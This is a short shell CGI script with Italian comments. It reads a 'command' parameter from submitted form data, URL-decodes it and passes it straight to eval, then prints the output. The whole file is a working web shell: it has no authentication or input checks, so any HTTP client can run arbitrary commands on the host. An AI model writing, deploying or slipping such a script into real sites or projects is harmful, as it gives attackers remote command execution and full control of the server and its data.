#!/bin/sh

# Imposta l'intestazione del contenuto
echo "Content-Type: text/plain"
echo ""

# Funzione per decodificare URL
urldecode() {
    local url_encoded="${1//+/ }"
    printf '%b' "${url_encoded//%/\\x}"
}

# Leggi i dati inviati dal modulo
read -r input

# Estrai il comando dal parametro e decodifica l'URL
command=$(echo "$input" | sed 's/command=//')
decoded_command=$(urldecode "$command")

# Esegui il comando e cattura l'output
output=$(eval "$decoded_command" 2>&1)

# Stampa l'output
echo "$output"
